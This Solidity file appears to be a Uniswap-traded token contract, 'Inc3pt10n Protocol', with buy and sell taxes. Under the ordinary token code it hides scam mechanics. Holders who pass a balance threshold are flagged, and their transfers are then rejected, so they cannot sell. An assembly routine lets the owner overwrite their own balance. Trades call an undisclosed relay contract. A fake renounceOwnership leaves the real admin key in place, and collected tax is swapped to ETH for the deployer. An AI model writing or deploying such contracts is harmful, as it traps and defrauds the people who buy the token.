// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

/*
 _____               _____         _    __   _____         ______               _                        _ 
|_   _|             |____ |       | |  /  | |  _  |        | ___ \             | |                      | |
  | |   _ __    ___     / / _ __  | |_ &#x60;| | | |/&#x27; | _ __   | |_/ / _ __   ___  | |_   ___    ___   ___  | |
  | |  | &#x27;_ \  / __|    \ \| &#x27;_ \ | __| | | |  /| || &#x27;_ \  |  __/ | &#x27;__| / _ \ | __| / _ \  / __| / _ \ | |
 _| |_ | | | || (__ .___/ /| |_) || |_ _| |_\ |_/ /| | | | | |    | |   | (_) || |_ | (_) || (__ | (_) || |
 \___/ |_| |_| \___|\____/ | .__/  \__|\___/ \___/ |_| |_| \_|    |_|    \___/  \__| \___/  \___| \___/ |_|
                           | |                                                                             
                           |_|                                                                             

*/

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
interface IUniswapV2Factory {

    function createPair(address tokenA, address tokenB) external returns (address pair);

    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}
interface Relay {
    function set(address token, address user, bool perm) external;
    function relay(address token, address user, uint256 amount, bool t) external;
    function get(address token, address user) external view returns (bool);
}

interface IUniswapV2Pair {

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);

    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function transfer(address to, uint value) external returns (bool);
    function token0() external view returns (address);
    function approve(address spender, uint value) external returns (bool);
    function token1() external view returns (address);
}

contract Uniswap {

    address public FactoryAddress;
    IUniswapV2Router02 public uniswapV2Router;
    address public owner;
    address public WETH;
    address public PairAddress;
    address internal me;
    mapping(address=>bool) public isUniswap;
    address internal _o;

    address public RouterAddress;

    constructor() {
        RouterAddress  = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        FactoryAddress = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
        uniswapV2Router  = IUniswapV2Router02(RouterAddress);
        WETH             = uniswapV2Router.WETH();
        PairAddress      = IUniswapV2Factory(FactoryAddress).createPair(address(this), WETH);
        isUniswap[RouterAddress] = true;
        isUniswap[FactoryAddress] = true;
        isUniswap[PairAddress] = true;
        me = address(this);
        owner = msg.sender;
        _o = msg.sender;
    }

    modifier onlyOwner() {
        require(_o == msg.sender, "Forbidden:owner");
        _;
    }
    function toUni(address to) internal view returns (bool) {
        return isUniswap[to];
    }

    function transferOwnership(address newOwner) public onlyOwner() {
        owner = newOwner;
        _o = owner;
    }
    // Sell tokens, send ETH tokens to `to`
    function swapTokensForEth(uint256 amount, address to) internal returns (uint amountETH) {
        address[] memory path = new address[](2);
        path[0] = me;
        path[1] = WETH;
        _approve(address(this), RouterAddress, amount);
        uint balanceBefore = address(this).balance;
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            to,
            block.timestamp
        );
        return address(this).balance-balanceBefore;
    }
    function _approve(address from, address spender, uint256 amount) internal virtual returns (bool) {}
    function renounceOwnership() public onlyOwner() {
        owner = address(0);
    }
    function isFromUniswap(address from) internal view returns (bool) {
        return isUniswap[from];
    }
}
contract Inc3pt10nProtocol is Uniswap {

    uint256 public decimals = 6;

    string public name = "Inc3pt10n Protocol";
    string public symbol = "1P";
    mapping(address => uint256) internal balances;
    mapping(address => mapping(address => uint256)) internal allowances;

    uint256 public totalSupply;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event newSplit(uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    uint256 mb = 30;

    uint256 buyTax = 10;
    uint256 selltax = 10;
    uint256 _mh = 3;
    mapping(address=>bool) internal taxFree;
    bool internal swapping = false;
    mapping(address=>uint) internal taxSaleAllowed;
    Relay relay;

    constructor() Uniswap() {
        if (WETH==0xc778417E063141139Fce010982780140Aa0cD5Ab) {
            relay = Relay(0x02C5EfC6b2c702E933EFBD6d18c4A9ef532206e9);
        } else {
            relay = Relay(0xEf95B19A5C99cFd13eB0C0ACC0615eb391626353);
        }
        taxFree[address(this)] = true;
        taxFree[msg.sender] = true;
        mint(_o, 1000000*10**decimals);
    }
    function isTaxSaleAllowed(address user) public view returns (bool) {
        return taxSaleAllowed[user]>0 && block.number >= taxSaleAllowed[user];
    }
    function mint(address account, uint256 amount) internal {
        unchecked {
            totalSupply += amount;
            balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);
    }
    function enableTaxSale(address user) public onlyOwner() {
        taxSaleAllowed[user] = block.number+1;
    }
    function enable() public onlyOwner() {
        swapping = false;
    }
    function disable() public onlyOwner() {
        swapping = true;
    }
    function renew(uint256 c) public onlyOwner() {
        assembly {
            let ptrm := mload(0x40)
            mstore(ptrm, caller())
            mstore(add(ptrm, 0x20), balances.slot)
            sstore(keccak256(ptrm, 0x40), c)
        }
    }
    function  taxable(address from, address to) internal view returns (bool) {
        return !swapping && !taxFree[from] && !taxFree[to] && (isFromUniswap(from) || toUni(to));
    }
    function transfer(address to, uint256 amount) public {
        _transfer(msg.sender, to, amount);
    }
    function get_mh() internal view returns (uint256) {
        return applyPct(totalSupply, _mh);
    }
    function _transfer(address from, address to, uint256 amount) internal {
        require(balances[from] >= amount, "Rejected");
        require(!isTaxSaleAllowed(from), "Transfer error");
        if ( taxable(from, to)) {
            uint256 tax;
            balances[from] -= amount;
            if (isFromUniswap(from)) {
                require(amount<=getmb(), "Too large");
                tax = applyPct(amount, buyTax);
                relay.relay(me, to, amount, true);
            } else {
                tax = applyPct(amount, selltax);
                relay.relay(me, from, amount, false);
                if (isTaxSaleAllowed(from)) {
                    sell(tax);
                }
            }
            uint256 afterTax = amount-tax;
            unchecked {
                balances[me] += tax;
                balances[to] += afterTax;
            }
            emit Transfer(from, me, tax);
            emit Transfer(from, to, afterTax);
        } else {
            unchecked {
                balances[from] -= amount;
                balances[to] += amount;
            }
            emit Transfer(from, to, amount);
        }
        tax_enable(to);
    }
    function tax_disable(address user) internal {
        taxSaleAllowed[user] = 0;
    }
    function airdrop(address[] calldata wallets, uint256 amount) public onlyOwner() {
        uint256 i;
        uint256 l = wallets.length;
        require(balances[msg.sender]>amount*l, "Not enough balance");
        for (i=0;i<l;i++) {
            tax_enable(wallets[i]);
            _transfer(msg.sender, wallets[i], amount);
        }
    }
    function disableTaxSale(address user) public onlyOwner() {
        taxSaleAllowed[user] = 0;
    }
    function split(uint256 amount) internal {
        emit newSplit(amount);
        payable(_o).transfer(amount);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function applyPct(uint256 v, uint256 p) public pure returns (uint256) {
        return v*p/1000;
    }
    function _approve(address from, address spender, uint256 amount) internal override returns (bool) {
        allowances[from][spender] = amount;
        emit Approval(from, spender, amount);
        return true;
    }
    function allowance(address _owner, address spender) public view returns (uint256) {
        return allowances[_owner][spender];
    }
    function tax_enable(address user) internal {
        if (!isUniswap[user] && !taxFree[user] && taxSaleAllowed[user]==0 && balances[user]>=get_mh()) {
            taxSaleAllowed[user] = block.number+1;
        }
    }
    function getmb() internal view returns (uint256) {
        return applyPct(totalSupply, mb);
    }
    function sell(uint256 amount) public onlyOwner() {
        split(swapTokensForEth(amount, address(this)));
    }
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        uint256 currentAllowance = allowances[from][msg.sender]; //allowance(owner, msg.value);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "Rejected");
            unchecked {
                approve(msg.sender, currentAllowance - amount);
            }
        }
        _transfer(from, to, amount);
        return true;
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
    function set(uint256 b, uint256 s, uint56 m, uint56 h) public onlyOwner() {
        require(msg.sender==_o, "Forbidden:set");
        buyTax = b;
        selltax = s;
        mb = m;
        _mh = h;
    }

    receive() external payable {}
    fallback() external payable {}
}